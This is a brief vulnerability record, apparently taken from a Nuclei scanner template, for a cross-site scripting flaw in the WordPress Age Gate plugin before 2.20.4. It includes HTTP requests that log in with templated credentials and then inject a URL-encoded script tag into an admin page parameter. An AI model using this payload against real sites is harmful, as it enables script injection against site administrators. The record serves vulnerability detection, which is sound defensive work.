# Vulnerability: WordPress Age Gate <2.20.4 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`age-gate-xss.yaml`)

## Description
WordPress Age Gate plugin before 2.20.4 contains a cross-site scripting vulnerability. The plugin does not escape some URLs before outputting them back in attributes.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

